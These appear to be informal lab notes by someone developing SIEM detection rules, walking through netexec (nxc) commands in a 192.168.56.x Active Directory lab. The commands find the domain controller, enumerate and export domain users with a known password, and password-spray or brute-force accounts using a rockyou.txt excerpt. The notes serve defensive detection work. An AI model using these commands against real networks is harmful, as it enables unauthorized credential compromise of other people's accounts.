Used diferent echniques to find new detection rules :
- enabled rules built-in in the siem 

About tools :
- kerbrute
- nxc
- sharphound

nxc is an assment and exploitation tool.
First i ran an smb enumeration : 
- nxc smb 192.168.56.0/24, the dc is the one with the 'signing:True' flag 

also can be identify like this : 
-  nxc ldap 192.168.56.0/24 --dc-list

In case you already have a successful account 
- nxc smb 192.168.56.0/24 -u Juliette -p 'Password1' --users

Once i get all users of my domain i can export a list to run a password spraying or a bruteforce 
- nxc smb 192.168.56.102 -u Juliette -p 'Password1' --users-export account.txt

Now i can test password spraying or bruteforce 
- nxc smb 192.168.56.102 -u account.txt -p 'Password1' --no-bruteforce --continue-on-success


- nxc smb 192.168.56.102 -u account.txt -p password.txt --no-bruteforce --continue-on-success
for the passwords list i copy first lines of /usr/share/worlists/rockyou.txt and then add the password i already have to it


